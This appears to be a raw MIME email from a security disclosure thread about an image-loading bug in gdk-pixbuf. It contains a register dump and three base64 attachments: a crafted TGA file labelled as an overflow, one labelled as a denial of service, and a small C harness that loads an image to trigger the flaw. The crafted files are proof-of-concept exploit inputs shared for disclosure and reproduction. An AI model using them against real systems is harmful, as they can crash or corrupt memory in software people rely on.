 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x33 =C2=A0 =C2=A0 =C2=A0 =C2=A051<br>ss =C2=
=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x2b =C2=A0 =C2=A0 =C2=A0 =C2=A043<b=
r>ds =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=A0 =C2=
=A00<br>es =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=A0 =C2=
=A0 =C2=A00<br>fs =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=A0 =C2=
=A0 =C2=A0 =C2=A00<br>gs =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 0x0 =C2=
=A0 =C2=A0 =C2=A0 =C2=A00</div><div>=C2=A0</div><blockquote class=3D"gmail_=
quote" style=3D"margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,=
204);padding-left:1ex">
<br>
Thanks,<br>
Andreas<br>
<span class=3D""><font color=3D"#888888"><br>
--<br>
Andreas Stieger &lt;<a href=3D"mailto:astieger@suse.com">astieger@suse.com<=
/a>&gt;<br>
Project Manager Security<br>
SUSE Linux GmbH, GF: Felix Imend=C3=B6rffer, Jane Smithard, Graham Norton, =
HRB 21284 (AG N=C3=BCrnberg)<br>
<br>
<br>
</font></span></blockquote></div><br></div></div>

--001a11406a5a3f82740521599098--

--001a11406a5a3f827b052159909a
Content-Type: application/x-gzip; name="overflow.tga.gz"
Content-Disposition: attachment; filename="overflow.tga.gz"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ifducbbc1

H4sICLgW8FUCA292ZXJmbG93LnRnYQABRQC6/wIACtciojVS+lK1BGNYQ2cg
J6zrFlUyHMxM0CZOmSUic2sz15HlnG/zf1WJWfr3iAJwuvvy2+DR6AAv7vhz
oT2nLI1FSS9oxrNFAAAA

--001a11406a5a3f827b052159909a
Content-Type: application/x-gzip; name="DoS.tga.gz"
Content-Disposition: attachment; filename="DoS.tga.gz"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ifducbbt2

H4sICL8W8FUCA0RvUy50Z2EABcEJEgAQDACxLaqXKf9/rSSQ4tDOwig8e74U
uTush2qlf/Hj0EEjAAAA

--001a11406a5a3f827b052159909a
Content-Type: text/x-csrc; charset=US-ASCII; name="pixbuf_vuln_poc.c"
Content-Disposition: attachment; filename="pixbuf_vuln_poc.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ifducbbz3

I2luY2x1ZGUgPGdkay1waXhidWYvZ2RrLXBpeGJ1Zi5oPgovLyBnY2MgcGl4
YnVmX3Z1bG5fcG9jLmMgLW8gcGl4YnVmX3Z1bG5fcG9jICBgcGtnLWNvbmZp
ZyAtLWxpYnMgLS1jZmxhZ3MgZ2RrLXBpeGJ1Zi0yLjBgCgppbnQgbWFpbihp
bnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIEdka1BpeGJ1ZiogYnVmOwog
ICAgaW50IHNpemUgPSAxODA7CiAgICBHRXJyb3IqIGVyciA9IE5VTEw7Cgog
ICAgYnVmID0gIGdka19waXhidWZfbmV3X2Zyb21fZmlsZV9hdF9zaXplKGFy
Z3ZbMV0sIHNpemUsIHNpemUsICZlcnIpOwoKICAgIGlmIChlcnIpCiAgICAg
IHByaW50ZiAoIkdlcnJvcjogJXNcbiIsIGVyci0+bWVzc2FnZSk7CgogICAg
Z19vYmplY3RfdW5yZWYoYnVmKTsKICAgIHJldHVybiAwOwp9Cg==

--001a11406a5a3f827b052159909a--
